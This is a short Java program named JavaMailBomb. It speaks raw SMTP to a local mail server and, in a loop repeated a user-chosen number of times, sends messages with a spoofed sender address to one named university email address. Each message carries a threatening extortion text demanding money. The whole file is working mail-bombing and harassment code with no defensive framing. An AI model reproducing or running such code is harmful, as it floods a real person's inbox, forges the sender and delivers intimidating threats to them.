import java.io.*;
import java.net.*;

public class JavaMailBomb {

    public static void main(String[] args) {

        if (args.length != 1) {
            System.exit(0);
        } else {
            int num = Integer.parseInt(args[0]);
            for(int i =1;i<=num;i++){
                try {
                Socket s = new Socket("127.0.0.1", 25);
                InputStream in = s.getInputStream();
                OutputStream out = s.getOutputStream();

                BufferedReader sin = new BufferedReader(new InputStreamReader(in));
                PrintWriter sout = new PrintWriter(out, true);
                /////////APT///////////
                System.out.println(sin.readLine());

                sout.println("HELO www.getdota.com");
                System.out.println(sin.readLine());

                sout.println("MAIL FROM:<admin@getdota.com>");
                System.out.println(sin.readLine());

                sout.println("RCPT TO:choopanr@kmutnb.ac.th");
                System.out.println(sin.readLine());

                sout.println("DATA");
                System.out.println(sin.readLine());
                
                sout.println("");
                sout.println("Subject: Pay us money,");
                sout.println("");
                sout.println("Dear user,");
                sout.println("    Pay us money otherwise you wile be captured");
                sout.println(".");
                System.out.println(sin.readLine());

                sout.println("QUIT");
                System.out.println(sin.readLine());

                ////////////////////////
                sin.close();
                sout.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            }
        }
    }
}
